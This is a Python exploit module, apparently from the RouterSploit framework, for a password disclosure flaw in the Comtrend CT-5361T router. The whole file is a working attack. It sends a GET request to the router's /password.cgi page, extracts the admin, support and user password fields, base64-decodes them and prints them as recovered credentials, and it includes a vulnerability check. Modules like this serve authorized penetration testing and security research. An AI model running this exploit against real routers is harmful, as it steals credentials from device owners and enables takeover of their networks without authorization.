from base64 import b64decode
import re

from routersploit import (
    exploits,
    print_status,
    print_error,
    print_success,
    print_table,
    sanitize_url,
    http_request,
    mute,
 )


class Exploit(exploits.Exploit):
    """
    Exploit implementation for Comtrend CT-5361T Password Disclosure vulnerability.
    If the target is vulnerable it allows to read credentials for admin, support and user."
    """
    __info__ = {
        'name': 'Comtrend CT 5361T Password Disclosure',
        'description': 'WiFi router Comtrend CT 5361T suffers from a Password Disclosure Vulnerability',
        'authors': [
            'TUNISIAN CYBER',  # routersploit module
         ],
        'references': [
            'https://packetstormsecurity.com/files/126129/Comtrend-CT-5361T-Password-Disclosure.html'
         ],
        'targets': [
            'Comtrend CT 5361T (more likely CT 536X)\n' +
            'Software Version: A111-312SSG-T02_R01\n' +
            'Wireless Driver Version: 4.150.10.15.cpe2.2'
         ]
    }

    target = exploits.Option('', 'Target address e.g. http://192.168.1.1')  # target address
    port = exploits.Option(80, 'Target port')  # default port

    def run(self):
        url = sanitize_url("{}:{}/password.cgi".format(self.target, self.port))

        print_status("Requesting for {}".format(url))

        response = http_request(method="GET", url=url)
        if response is None:
            return

        creds = []
        admin = re.findall("pwdAdmin = '(.+?)'", response.text)
        if len(admin):
            creds.append(('Admin', b64decode(admin[0])))

        support = re.findall("pwdSupport = '(.+?)'", response.text)
        if len(support):
            creds.append(('Support', b64decode(support[0])))

        user = re.findall("pwdUser = '(.+?)'", response.text)
        if len(user):
            creds.append(('User', b64decode(user[0])))

        if len(creds):
            print_success("Credentials found!")
            headers = ("Login", "Password")
            print_table(headers, *creds)
            print("NOTE: Admin is commonly implemented as root")
        else:
            print_error("Credentials could not be found")

    @mute
    def check(self):
        url = sanitize_url("{}:{}/password.cgi".format(self.target, self.port))

        response = http_request(method="GET", url=url)
        if response is None:
            return False  # target is not vulnerable

        if any(map(lambda x: x in response.text, ["pwdSupport", "pwdUser", "pwdAdmin"])):
            return True  # target vulnerable

        return False  # target is not vulnerable
